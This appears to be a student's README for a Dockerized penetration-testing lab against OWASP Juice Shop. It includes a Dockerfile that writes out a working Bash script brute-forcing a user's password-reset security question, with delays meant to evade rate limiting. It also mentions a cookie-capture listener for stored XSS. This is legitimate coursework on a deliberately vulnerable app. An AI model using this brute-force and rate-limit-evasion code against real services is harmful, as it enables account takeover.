<a name="readme-top"></a>
<div align="center">
    <img src="https://raw.githubusercontent.com/juice-shop/.github/main/profile/banner.jpg" alt="OWASP Juice Shop Banner" width="100%"/>
    <br>
    <h1>OWASP Juice Shop Vulnerability Analysis</h1>
</div>

<div align="center">

![Docker](https://img.shields.io/badge/Docker-Container-blue.svg?logo=docker)
![Windows](https://img.shields.io/badge/Host-Windows_11-0078D6.svg?logo=windows)
![Security](https://img.shields.io/badge/Type-Vulnerability_Analysis-red)
![License](https://img.shields.io/badge/License-MIT-yellow.svg)
![Status](https://img.shields.io/badge/Status-Completed-success)

**Version:** 1.0.0

**Security Researcher:** Daniel Hållbro (Student)

**School:** Frans Schartaus Handelsinstitut

  <h3>
    📄 <a href="https://github.com/DanielHallbro/OWASP_Juice_Shop_Analysis/raw/main/docs/Vulnerability_Report_Daniel_H.pdf">Download Vulnerability Report (PDF)</a> 
    &nbsp; | &nbsp; 
    📊 <a href="https://github.com/DanielHallbro/OWASP_Juice_Shop_Analysis/raw/main/docs/Vulnerability_6_Presentation_Daniel_H.pdf">Download Presentation Slides (PDF)</a>
  </h3>
  <p><i>(Direct download links to bypass GitHub preview limitations)</i></p>
</div>

<br>

This repository contains the **customized penetration testing environment** used to conduct a security assessment of the OWASP Juice Shop application. It utilizes **Docker** and **Docker Compose** to orchestrate a safe, isolated, and reproducible testing lab containing both the target application and a specialized Kali Linux attack container.

The environment includes a custom-built toolkit designed to automate reconnaissance, exploitation, and reporting tasks.

---

## Table of Contents

* [Project Overview](#project-overview)
* [The Toolkit](#the-toolkit)
* [Custom Automation](#custom-automation)
* [Prerequisites](#prerequisites)
* [Installation & Usage](#installation--usage)
* [Project Structure](#project-structure)
* [Resources & References](#resources--references)
* [Disclaimer](#disclaimer)

---

## Project Overview

The goal of this project was to perform a **Black Box** vulnerability analysis of OWASP Juice Shop v19.1.1. To ensure professional isolation and reproducibility, the entire engagement was conducted within a Dockerized network.

**Lab Architecture:**
The environment is structured as a two-node network:
* **Target (`FSjuice1`):** A vulnerable Node.js web application running on port `3000`.
* **Attacker (`daniel-tools`):** A custom Kali Linux instance equipped with security tools and listener port `9999`.
* **Network (`juice-net`):** An isolated Docker bridge network that prevents traffic from leaking to the host OS.

**Key Features:**
* **Isolation:** Containers communicate via internal DNS, preventing accidental exposure.
* **Persistency:** Interactive shell access allows for persistent storage of scan results.
* **Automation:** Includes custom Bash scripts for brute-force and sanitization.

<small>[To the top](#readme-top)</small>
---

## The Toolkit

The `Dockerfile` builds a lightweight **Kali Linux Rolling** image, customized with a specific set of tools required for this engagement.

| Tool | Category | Description & Usage in Project |
| :--- | :--- | :--- |
| **Nuclei** | Scanner | Template-based vulnerability scanner. Used to identify exposed sensitive files and observability failures (`/metrics`). |
| **Gobuster** | Discovery | Directory and file brute-forcing tool. Essential for discovering hidden paths like `/ftp` and `/administration`. |
| **Sqlmap** | Exploitation | Automated SQL injection tool. Used to verify injection points and exfiltrate the backend database schema. |
| **Curl** | Utility | Command-line HTTP client. Served as the core engine for the custom brute-force script to bypass client-side controls. |
| **Python3** | Utility | Used to host local HTTP listeners (Port 9999) for capturing stolen cookies during Stored XSS attacks. |
| **Wget** | Utility | Network downloader used to fetch specific wordlists during the image build process. |
| **Nano** | Editor | Lightweight terminal text editor for modifying scripts or notes inside the container. |
| **Dos2Unix** | Utility | Line-ending converter. Ensures scripts created on Windows/macOS run correctly in the Linux container. |
| **Zsh** | Shell | The default shell environment, enhanced with `autosuggestions` and `syntax-highlighting` for a smoother workflow. |
| **SecLists** | Resource | Professional wordlists (Daniel Miessler) fetched dynamically to keep the image size optimized. |
| **brute_reset.sh** | Custom | A custom-developed Bash script pre-installed in `/usr/local/bin/` to automate the password reset exploitation. |

<details>
  <summary>View Dockerfile Configuration (Dropdown)</summary>

```dockerfile
# Base Image: Latest Kali Linux Rolling Release
FROM kalilinux/kali-rolling

# System Update & Upgrade
RUN apt update --fix-missing && apt upgrade -y

# Install Zsh Shell & Productivity Plugins (Better terminal experience)
RUN apt install -y zsh zsh-autosuggestions zsh-syntax-highlighting bash-completion

# Install Penetration Testing Tools
# Added python3 for local web server capabilities
RUN apt install -y curl gobuster nano nuclei sqlmap wget dos2unix python3

# Setup Wordlist Directory
# Only fetching specific wordlists to keep image size optimized
RUN mkdir -p /usr/share/wordlists/

# 1. Fetch Common Web Paths (For Gobuster - A01)
RUN wget -P /usr/share/wordlists/ https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/common.txt

# 2. Fetch Top 1000 Male Names (For Brute-Force - A07)
RUN wget -P /usr/share/wordlists/ https://github.com/danielmiessler/SecLists/raw/master/Usernames/Names/malenames-usa-top1000.txt

# Create Custom Authentication Exploitation Tool
# This script automates the brute-forcing of the security question
RUN cat <<'EOF' > /usr/local/bin/brute_reset.sh
#!/bin/bash
TARGET="http://FSjuice1:3000/rest/user/reset-password"
USER="jim@juice-sh.op"
WORDLIST="/usr/share/wordlists/malenames-usa-top1000.txt"

echo "[!] Starting automated brute-force for $USER..."
echo "[!] Using wordlist: $WORDLIST"

while read -r raw_name; do
  [[ -z "$raw_name" || "$raw_name" == "#"* ]] && continue

  # Formatting: Convert names to Title Case (e.g., SAMUEL -> Samuel)
  name_lower=${raw_name,,}
  name=${name_lower^}

  # Execute POST request to the API
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$USER\", \"answer\": \"$name\", \"new\": \"password123!\", \"repeat\": \"password123!\"}")

  if [ "$RESPONSE" == "200" ]; then
    echo -e "\n[+] SUCCESS! Found correct answer for $USER: $name"
    exit 0
  elif [ "$RESPONSE" == "429" ]; then
    echo -ne " [!] Rate limited (429). Sleeping 5s...   \r"
    sleep 5
  else
    echo -ne "[-] Attempting: $name (Status: $RESPONSE)   \r"
    # Small delay (300ms) to bypass basic rate limiting
    sleep 0.3
  fi
done < "$WORDLIST"

echo -e "\n[!] Brute-force finished. No valid answer found."
EOF

# Finalize Script Setup
# 1. Convert line endings (CRLF -> LF) using dos2unix
# 2. Make script executable
RUN dos2unix /usr/local/bin/brute_reset.sh && chmod +x /usr/local/bin/brute_reset.sh

# Set Working Directory and Environment Variables
WORKDIR /work
ENV LC_ALL=C.UTF-8
ENV RUNNING_IN_DOCKER=true

# Start container with Zsh
ENTRYPOINT ["/bin/zsh"]
```
</details>

<small>[To the top](#readme-top)</small>
---

## Custom Automation

A key component of this environment is the **Custom Authentication Exploitation Tool** (`brute_reset.sh`). This script was developed to automate the exploitation of the Password Reset mechanism.

**Capabilities:**
* **Rate-Limit Bypass:** Implements a "Low and Slow" logic (300ms delay) to evade HTTP 429 blocking.
* **Sanitization:** Automatically converts uppercase wordlists to "Title Case" to match the application's case-sensitive requirements.
* **Integration:** Pre-installed in the container at `/usr/local/bin/brute_reset.sh`.

```bash
# Example snippet from the script logic
# The script checks for HTTP 429 (Too Many Requests) and sleeps if detected
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" ...)

if [ "$RESPONSE" == "429" ]; then
    echo "Rate limited. Sleeping..."
    sleep 5
fi
```

<small>[To the top](#readme-top)</small>
--- 

## Prerequisites

Before running this environment, ensure you have the following installed on your host machine:

* **Docker** (v20.10 or higher)
* **Docker Compose** (v1.29 or higher)

_Note: If you are using Docker Desktop for Windows or Mac, Docker Compose is usually included automatically._

<small>[To the top](#readme-top)</small>
---

## Installation & Usage

### 1. Clone the Repository
```bash
git clone https://github.com/DanielHallbro/OWASP_Juice_Shop_Analysis.git
cd OWASP_Juice_Shop_Analysis
```
### 2. Build the Environment
This command pulls the OWASP Juice Shop image and builds the custom Kali tools container according to the Dockerfile specifications.

**Important:** Ensure you are in the project root directory (where docker-compose.yml and dockerfile are located) before running this command.
```bash
docker-compose up --build -d
```
### 3. Access the Toolkit
Enter the interactive shell of the attacker container.
```bash
docker-compose exec tools /bin/zsh
```
### 4. Run the Tools
You can run tools either interactively inside the container or execute them directly from your host terminal.

**Option A:** Interactive Mode (Inside Container)

```bash
# Example: Run the custom brute-force script
brute_reset.sh

# Example: Run a Nuclei scan against the target
nuclei -u http://FSjuice1:3000
```

**Option B:** Direct Execution (From Host)
You can also run commands without entering the shell by passing them to `docker exec`.
```bash
# Run Nuclei directly from your host terminal
docker exec -it daniel-tools nuclei -u http://FSjuice1:3000

# Run the brute-force script directly
docker exec -it daniel-tools brute_reset.sh
```
<small>[To the top](#readme-top)</small>
---

## Project Structure

```markdown
OWASP_Juice_Shop_Analysis/
├── docs/                                         <-- Project deliverables.
│   ├── Vulnerability_Report_Daniel_H.pdf         <-- Full Vulnerability Analysis Report.
│   └── Vulnerability_6_Presentation_Daniel_H.pdf <-- Presentation slides (Vulnerability 6).
├── Dockerfile                                    <-- Defines the custom Kali Linux build and toolset.
├── docker-compose.yml                            <-- Orchestrates the Target and Attacker containers.
└── README.md                                     <-- Project documentation.
```

<small>[To the top](#readme-top)</small>
---

## Resources & References

**Target & Frameworks**
* [OWASP Juice Shop (Official Repo)](https://github.com/juice-shop/juice-shop)
* [OWASP Top 10 (2025)](https://owasp.org/Top10/)
* [MITRE CWE (Common Weakness Enumeration)](https://cwe.mitre.org/)
* [CVSS v3.1 Calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)

**Tools**
* [Docker Desktop](https://www.docker.com/products/docker-desktop/) - Containerization Platform
* [Burp Suite Community](https://portswigger.net/burp) - Web Proxy & Repeater
* [Nuclei](https://github.com/projectdiscovery/nuclei) - Vulnerability Scanner
* [Sqlmap](https://sqlmap.org/) - SQL Injection Automation
* [Gobuster](https://github.com/OJ/gobuster) - Directory/File Brute-forcing
* [SecLists](https://github.com/danielmiessler/SecLists) - Security Wordlists
* [Python 3 (http.server)](https://docs.python.org/3/library/http.server.html) - Used for Payload Delivery/Exfiltration
* [Curl](https://curl.se/docs/manpage.html) - Command line tool for transferring data

<small>[To the top](#readme-top)</small>
---

## Disclaimer

This repository is for educational purposes only. The tools and techniques demonstrated here were performed on a locally hosted, intentionally vulnerable application (OWASP Juice Shop) as part of a controlled academic assignment.

Do not use these tools on systems you do not own or have explicit permission to test.

<small>[To the top](#readme-top)</small>